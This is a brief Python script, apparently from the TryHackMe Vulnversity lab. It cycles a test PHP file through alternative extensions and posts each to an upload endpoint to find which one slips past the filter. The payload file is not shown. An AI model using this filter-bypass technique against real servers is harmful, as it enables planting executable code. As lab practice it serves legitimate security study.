#!/usr/bin/python3

import os
import requests

filename = "test.php"
_path = "/home/kali/ctf/thm/vulnversity/"
extensions = [".php3", ".php4", ".php5", ".phtml"]

url = "http://10.10.105.114:3333/internal/index.php"

for ext in extensions:
	new_name = "test{}".format(ext)
	os.rename("{}{}".format(_path, filename), "{}{}".format(_path, new_name))
	f = open(new_name, "rb")
	r = requests.post(url, files={"file": f})
	print(r.content)
	filename = new_name